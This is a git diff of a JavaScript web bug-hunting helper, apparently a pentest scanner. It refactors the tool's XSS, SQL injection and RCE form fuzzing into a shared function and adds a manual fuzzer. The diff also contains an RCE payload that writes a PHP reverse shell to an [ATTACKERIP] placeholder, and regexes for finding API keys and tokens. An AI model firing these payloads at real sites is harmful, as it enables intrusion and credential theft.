@@ -112,6 +112,72 @@ function JsBugHuntingHelper () {
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
   ]
 
+  const searchElements = [
+    // new SearchElement('single line comment', 'string', ' //'),
+    // new SearchElement('block comment', 'string', '/*'),
+    new SearchElement('form', 'string', '<form'),
+    new SearchElement('url', 'string', 'http://'),
+    new SearchElement('url', 'string', 'https://'),
+    new SearchElement('web socket', 'string', 'ws://'),
+    new SearchElement('web socket', 'string', 'wss://'),
+    new SearchElement('post request', 'string', '"POST"'),
+    new SearchElement('get request', 'string', '"GET"'),
+    new SearchElement('post request', 'string', "'POST"),
+    new SearchElement('get request', 'string', "'GET'"),
+    new SearchElement('ajax request', 'string', '.ajax'),
+    new SearchElement('post request', 'string', '$.post'),
+    new SearchElement('get request', 'string', '$.get'),
+    new SearchElement('query', 'string', 'query'),
+    new SearchElement('api call', 'string', '/api'),
+    new SearchElement('php file', 'string', '.php'),
+    new SearchElement('asp file', 'string', '.asp'),
+    new SearchElement('json file', 'string', '.json'),
+    new SearchElement('mailto protocol', 'string', 'mailto:'),
+    new SearchElement('something on mysql', 'string', 'mysql'),
+    new SearchElement('something on email', 'string', '"email"'),
+    new SearchElement('something on username', 'string', '"username"'),
+    new SearchElement('something on username', 'string', '"user"'),
+    new SearchElement('something on password', 'string', '"password"'),
+    new SearchElement('something on password', 'string', '"pass"'),
+    new SearchElement('something on password', 'string', '"psw"'),
+    new SearchElement('something on password', 'string', '"pwd"'),
+    new SearchElement('REGEX url with params', 'regEx', /\?(\w+=\w+)/),
+    new SearchElement('REGEX email address', 'regEx', /\S+@\S+\.\S+/),
+
+    // api keys regexes
+    new SearchElement('Twitter Access Token', 'regEx', /[1-9][ 0-9]+-[0-9a-zA-Z]{40}/),
+    new SearchElement('Twitter Username', 'regEx', /(^|[^@\w])@(\w{1,15})\b/),
+    new SearchElement('FB Access Token', 'regEx', /EAACEdEose0cBA[0-9A-Za-z]+/),
+    new SearchElement('FB OAuth 2.0', 'regEx', /[A-Za-z0-9]{125}/),
+    new SearchElement('Google API Key', 'regEx', /AIza[0-9A-Za-z-_]{35}/),
+    new SearchElement('Google OAuth 2.0 Auth Code', 'regEx', /4\/[0-9A-Za-z-_]+/),
+    new SearchElement('Google OAuth 2.0 Refresh Token', 'regEx', /1\/[0-9A-Za-z-]{43}|1\/[0-9A-Za-z-]{64}/),
+    new SearchElement('Google OAuth 2.0 Access Token', 'regEx', /ya29.[0-9A-Za-z-_]+/),
+    new SearchElement('Github OAuth 2.0 ID', 'regEx', /[A-Za-z0-9_]{255}/),
+    new SearchElement('Picatic API Key', 'regEx', /sk_live_[0-9a-z]{32}/),
+    new SearchElement('Stripe API Key', 'regEx', /sk_live_[0-9a-zA-Z]{24}/),
+    new SearchElement('Square Access Token', 'regEx', /sqOatp-[0-9A-Za-z-_]{22}/),
+    new SearchElement('Square OAuth Secret', 'regEx', /q0csp-[ 0-9A-Za-z-_]{43}/),
+    new SearchElement('Paypal/Braintree Access Token', 'regEx', /\$[0-9a-z]{161[0-9a,]{32}/),
+    new SearchElement('AWS Auth Token', 'regEx', /amzn.mws.[0-9a-f]{8}-[0-9a-f]{4}-10-9a-f1{4}-[0-9a,]{4}-[0-9a-f]{12}/),
+    new SearchElement('Twilio API Key', 'regEx', /55[0-9a-fA-F]{32}/),
+    new SearchElement('MailGun API Key', 'regEx', /key-[0-9a-zA-Z]{32}/),
+    new SearchElement('MailChimp API Key', 'regEx', /[0-9a-f]{32}-us[0-9]{1,2}/),
+    new SearchElement('Slack OAuth 2.0', 'regEx', /xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}/),
+    new SearchElement('Slack OAuth v2 Configuration Token', 'regEx', /xoxe.xoxp-1-[0-9a-zA-Z]{166}/),
+    new SearchElement('Slack OAuth v2 Refresh Token', 'regEx', /xoxe-1-[0-9a-zA-Z]{147}/),
+    new SearchElement('Slack Webhook', 'regEx', /T[a-zA-Z0-9_]{8}\/B[a-zA-Z0-9_]{8}\/[a-zA-Z0-9_]{24}/),
+    new SearchElement('AWS Access Key ID', 'regEx', /AKIA[0-9A-Z]{16}/),
+    new SearchElement('Google Cloud OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
+    new SearchElement('Google Clous API Key', 'regEx', /[A-Za-z0-9_]{21}--[A-Za-z0-9_]{8}/),
+    new SearchElement('Heroku API Key', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
+    new SearchElement('Heroku OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
+
+    new SearchElement('Js One Line Comment', 'string', '//'),
+    new SearchElement('Js Multi Line Comment', 'string', '/*')
+    /* new SearchElement('HTML Multi Line Comment', 'string', '<!--') */
+  ]
+
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
   // @return void
@@ -139,10 +205,9 @@ function JsBugHuntingHelper () {
 
     removeBootstrapDuplicatedStyles('.fade')
     removeBootstrapDuplicatedStyles('.collapse')
+  }
 
-    // to do
-    // window.wrappedJSObject.manualAjaxFuzzer = this.manualAjaxFuzzer
-
+  this.normalScan = async function () {
     let gui = ''
     let accordionNumber = 0
 
@@ -194,9 +259,9 @@ function JsBugHuntingHelper () {
     console.log('\n')
 
     /* const table = interfaceTable
-    recursiveEnumerate(window, 0).forEach((v) => {
-      table.innerHTML += '<tr><td><a href="javascript:console.log(' + v.name + ')">' + v.name + '</a></td></tr>'
-    }) */
+  recursiveEnumerate(window, 0).forEach((v) => {
+    table.innerHTML += '<tr><td><a href="javascript:console.log(' + v.name + ')">' + v.name + '</a></td></tr>'
+  }) */
 
     console.log('JS Listeners Suspicious Points'.toUpperCase())
 
@@ -363,7 +428,7 @@ function JsBugHuntingHelper () {
     if (this.formFuzzingEnabled === true) {
       console.log('Form Vulnerabilities'.toUpperCase())
 
-      const form = await formFuzzer.call(this)
+      const form = await formLoop.call(this)
       console.log(form)
 
       accordionNumber++
@@ -389,83 +454,51 @@ function JsBugHuntingHelper () {
     console.log('Created by Davide Cavallini')
     console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
 
+    guiEnabled(gui)
+  }
+
+  // eslint-disable-next-line no-unused-vars
+  this.manualFuzzer = async function (manualFuzzerUrl, manualFuzzerMethod, manualFuzzerParams) {
+    try {
+      const params = Object.entries(JSON.parse(manualFuzzerParams))
+
+      const originalParamLength = params.length
+      let result = []
+      result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, manualFuzzerMethod, params))
+      result = result.filter((v) => v.paramName !== undefined)
+      console.log(result)
+
+      let gui = ''
+
+      let accordionNumber = 0
+
+      accordionNumber++
+      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Form Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
+
+      gui += '<table class="table table-responsive table-hover">'
+
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+
+      result.forEach((v) => {
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+      })
+
+      gui += '</table>'
+
+      gui += '</div></div></div>'
+
+      guiEnabled(gui)
+    } catch (e) {
+      alert(e)
+    }
+  }
+
+  function guiEnabled (gui) {
     $('#guiModal #accordionExample').html(gui)
 
     document.getElementById('openGuiButton').disabled = false
     document.getElementById('openGuiButton').innerHTML = 'OPEN GUI BUTTON'
   }
-
-  function SearchElement (description, type, string) {
-    this.description = description
-    this.type = type
-    this.string = string
-  }
-
-  const searchElements = [
-    // new SearchElement('single line comment', 'string', ' //'),
-    // new SearchElement('block comment', 'string', '/*'),
-    new SearchElement('form', 'string', '<form'),
-    new SearchElement('url', 'string', 'http://'),
-    new SearchElement('url', 'string', 'https://'),
-    new SearchElement('web socket', 'string', 'ws://'),
-    new SearchElement('web socket', 'string', 'wss://'),
-    new SearchElement('post request', 'string', '"POST"'),
-    new SearchElement('get request', 'string', '"GET"'),
-    new SearchElement('post request', 'string', "'POST"),
-    new SearchElement('get request', 'string', "'GET'"),
-    new SearchElement('ajax request', 'string', '.ajax'),
-    new SearchElement('post request', 'string', '$.post'),
-    new SearchElement('get request', 'string', '$.get'),
-    new SearchElement('query', 'string', 'query'),
-    new SearchElement('api call', 'string', '/api'),
-    new SearchElement('php file', 'string', '.php'),
-    new SearchElement('asp file', 'string', '.asp'),
-    new SearchElement('json file', 'string', '.json'),
-    new SearchElement('mailto protocol', 'string', 'mailto:'),
-    new SearchElement('something on mysql', 'string', 'mysql'),
-    new SearchElement('something on email', 'string', '"email"'),
-    new SearchElement('something on username', 'string', '"username"'),
-    new SearchElement('something on username', 'string', '"user"'),
-    new SearchElement('something on password', 'string', '"password"'),
-    new SearchElement('something on password', 'string', '"pass"'),
-    new SearchElement('something on password', 'string', '"psw"'),
-    new SearchElement('something on password', 'string', '"pwd"'),
-    new SearchElement('REGEX url with params', 'regEx', /\?(\w+=\w+)/),
-    new SearchElement('REGEX email address', 'regEx', /\S+@\S+\.\S+/),
-
-    // api keys regexes
-    new SearchElement('Twitter Access Token', 'regEx', /[1-9][ 0-9]+-[0-9a-zA-Z]{40}/),
-    new SearchElement('Twitter Username', 'regEx', /(^|[^@\w])@(\w{1,15})\b/),
-    new SearchElement('FB Access Token', 'regEx', /EAACEdEose0cBA[0-9A-Za-z]+/),
-    new SearchElement('FB OAuth 2.0', 'regEx', /[A-Za-z0-9]{125}/),
-    new SearchElement('Google API Key', 'regEx', /AIza[0-9A-Za-z-_]{35}/),
-    new SearchElement('Google OAuth 2.0 Auth Code', 'regEx', /4\/[0-9A-Za-z-_]+/),
-    new SearchElement('Google OAuth 2.0 Refresh Token', 'regEx', /1\/[0-9A-Za-z-]{43}|1\/[0-9A-Za-z-]{64}/),
-    new SearchElement('Google OAuth 2.0 Access Token', 'regEx', /ya29.[0-9A-Za-z-_]+/),
-    new SearchElement('Github OAuth 2.0 ID', 'regEx', /[A-Za-z0-9_]{255}/),
-    new SearchElement('Picatic API Key', 'regEx', /sk_live_[0-9a-z]{32}/),
-    new SearchElement('Stripe API Key', 'regEx', /sk_live_[0-9a-zA-Z]{24}/),
-    new SearchElement('Square Access Token', 'regEx', /sqOatp-[0-9A-Za-z-_]{22}/),
-    new SearchElement('Square OAuth Secret', 'regEx', /q0csp-[ 0-9A-Za-z-_]{43}/),
-    new SearchElement('Paypal/Braintree Access Token', 'regEx', /\$[0-9a-z]{161[0-9a,]{32}/),
-    new SearchElement('AWS Auth Token', 'regEx', /amzn.mws.[0-9a-f]{8}-[0-9a-f]{4}-10-9a-f1{4}-[0-9a,]{4}-[0-9a-f]{12}/),
-    new SearchElement('Twilio API Key', 'regEx', /55[0-9a-fA-F]{32}/),
-    new SearchElement('MailGun API Key', 'regEx', /key-[0-9a-zA-Z]{32}/),
-    new SearchElement('MailChimp API Key', 'regEx', /[0-9a-f]{32}-us[0-9]{1,2}/),
-    new SearchElement('Slack OAuth 2.0', 'regEx', /xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}/),
-    new SearchElement('Slack OAuth v2 Configuration Token', 'regEx', /xoxe.xoxp-1-[0-9a-zA-Z]{166}/),
-    new SearchElement('Slack OAuth v2 Refresh Token', 'regEx', /xoxe-1-[0-9a-zA-Z]{147}/),
-    new SearchElement('Slack Webhook', 'regEx', /T[a-zA-Z0-9_]{8}\/B[a-zA-Z0-9_]{8}\/[a-zA-Z0-9_]{24}/),
-    new SearchElement('AWS Access Key ID', 'regEx', /AKIA[0-9A-Z]{16}/),
-    new SearchElement('Google Cloud OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
-    new SearchElement('Google Clous API Key', 'regEx', /[A-Za-z0-9_]{21}--[A-Za-z0-9_]{8}/),
-    new SearchElement('Heroku API Key', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
-    new SearchElement('Heroku OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
-
-    new SearchElement('Js One Line Comment', 'string', '//'),
-    new SearchElement('Js Multi Line Comment', 'string', '/*')
-    /* new SearchElement('HTML Multi Line Comment', 'string', '<!--') */
-  ]
 
   function htmlEntities (str) {
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
@@ -853,8 +886,8 @@ function JsBugHuntingHelper () {
   }
 
   // fuzz all forms in the webpage
-  async function formFuzzer () {
-    const result = []
+  async function formLoop () {
+    let result = []
     // eslint-disable-next-line no-undef
     // probabilmente il problema è questo async
     for (const form of Q('form')) {
@@ -869,149 +902,105 @@ function JsBugHuntingHelper () {
         }
         url = b + url
       }
-      let method = 'GET'
 
+      let method = 'GET'
       if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post' || $(form).attr('method') === '$_POST' || $(form).attr('method') === '$_post') {
         method = 'POST'
       }
 
-      if (this.xssScanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsXSS) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,textarea').each((i2, v2) => {
-              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
-                // eslint-disable-next-line no-undef
-                // console.log($(v2).attr('name'), $(v2).val())
-                const tagName = $(v2)[0].tagName
-                let value = ''
+      const tempParams = []
+      // eslint-disable-next-line no-undef
+      $(form).find('input,button,select,textarea').each((i2, v2) => {
+        if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
+        // eslint-disable-next-line no-undef
+        // console.log($(v2).attr('name'), $(v2).val())
+          const tagName = $(v2)[0].tagName
+          let value = ''
 
-                if (tagName === 'SELECT') {
-                  value = $(v2).find('option:selected').val()
-                } else if (tagName === 'INPUT') {
-                  const type = $(v2).attr('type').toLowerCase()
-                  if (type === 'checkbox' || type === 'radio') {
-                    value = $(v2).prop('checked').toString()
-                  } else {
-                    value = $(v2).val()
-                  }
-                }
-                tempParams.push([$(v2).attr('name'), value])
-              }
-            })
-
-            const paramsEntities = tempParams
-
-            const r = await new Payload(
-              url,
-              method,
-              paramsEntities,
-              payload.previousAction,
-              payload.payloadString,
-              // eslint-disable-next-line no-useless-escape
-              payload.expectedResult,
-              'XSS'
-            ).isValidResponse()
-            if (r !== false) {
-              result.push(r)
+          if (tagName === 'SELECT') {
+            value = $(v2).find('option:selected').val()
+          } else if (tagName === 'INPUT') {
+            const type = $(v2).attr('type').toLowerCase()
+            if (type === 'checkbox' || type === 'radio') {
+              value = $(v2).prop('checked').toString()
+            } else {
+              value = $(v2).val()
             }
           }
+          tempParams.push([$(v2).attr('name'), value])
         }
-      }
+      })
 
-      if (this.sqlInjectionScanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsSQLi) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,textarea').each((i2, v2) => {
-              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
-                // eslint-disable-next-line no-undef
-                // console.log($(v2).attr('name'), $(v2).val())
-                const tagName = $(v2)[0].tagName
-                let value = ''
+      const paramsEntities = tempParams
 
-                if (tagName === 'SELECT') {
-                  value = $(v2).find('option:selected').val()
-                } else if (tagName === 'INPUT') {
-                  const type = $(v2).attr('type').toLowerCase()
-                  if (type === 'checkbox' || type === 'radio') {
-                    value = $(v2).prop('checked').toString()
-                  } else {
-                    value = $(v2).val()
-                  }
-                }
-                tempParams.push([$(v2).attr('name'), value])
-              }
-            })
+      result = result.concat(await fuzzer.call(this, originalParamsLength, url, method, paramsEntities))
+    }
+    // console.log('FF', result)
+    return result.filter((v) => v.paramName !== undefined)
+  }
 
-            const paramsEntities = tempParams
-
-            const r = await new Payload(
-              url,
-              method,
-              paramsEntities,
-              payload.previousAction,
-              payload.payloadString.replace('[ATTACKERIP]', this.attackerIp),
-              // eslint-disable-next-line no-useless-escape
-              payload.expectedResult,
-              'SQL Injection'
-            ).isValidResponse()
-            if (r !== false) {
-              result.push(r)
-            }
-          }
-        }
-      }
-
-      if (this.rceScanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsRCE) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,textarea').each((i2, v2) => {
-              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
-                // eslint-disable-next-line no-undef
-                // console.log($(v2).attr('name'), $(v2).val())
-                const tagName = $(v2)[0].tagName
-                let value = ''
-
-                if (tagName === 'SELECT') {
-                  value = $(v2).find('option:selected').val()
-                } else if (tagName === 'INPUT') {
-                  const type = $(v2).attr('type').toLowerCase()
-                  if (type === 'checkbox' || type === 'radio') {
-                    value = $(v2).prop('checked').toString()
-                  } else {
-                    value = $(v2).val()
-                  }
-                }
-                tempParams.push([$(v2).attr('name'), value])
-              }
-            })
-
-            const paramsEntities = tempParams
-
-            const r = await new Payload(
-              url,
-              method,
-              paramsEntities,
-              payload.previousAction,
-              payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
-              // eslint-disable-next-line no-useless-escape
-              payload.expectedResult,
-              'RCE'
-            ).isValidResponse()
-            if (r !== false) {
-              result.push(r)
-            }
+  async function fuzzer (originalParamsLength, url, method, paramsEntities) {
+    const result = []
+    if (this.xssScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsXSS) {
+          const r = await new Payload(
+            url,
+            method,
+            paramsEntities,
+            payload.previousAction,
+            payload.payloadString,
+            // eslint-disable-next-line no-useless-escape
+            payload.expectedResult,
+            'XSS'
+          ).isValidResponse()
+          if (r !== false) {
+            result.push(r)
           }
         }
       }
     }
-    // console.log('FF', result)
-    return result.filter((v) => v.paramName !== undefined)
+
+    if (this.sqlInjectionScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsSQLi) {
+          const r = await new Payload(
+            url,
+            method,
+            paramsEntities,
+            payload.previousAction,
+            payload.payloadString.replace('[ATTACKERIP]', this.attackerIp),
+            // eslint-disable-next-line no-useless-escape
+            payload.expectedResult,
+            'SQL Injection'
+          ).isValidResponse()
+          if (r !== false) {
+            result.push(r)
+          }
+        }
+      }
+    }
+
+    if (this.rceScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsRCE) {
+          const r = await new Payload(
+            url,
+            method,
+            paramsEntities,
+            payload.previousAction,
+            payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
+            // eslint-disable-next-line no-useless-escape
+            payload.expectedResult,
+            'RCE'
+          ).isValidResponse()
+          if (r !== false) {
+            result.push(r)
+          }
+        }
+      }
+    }
+    return result
   }
 }
 
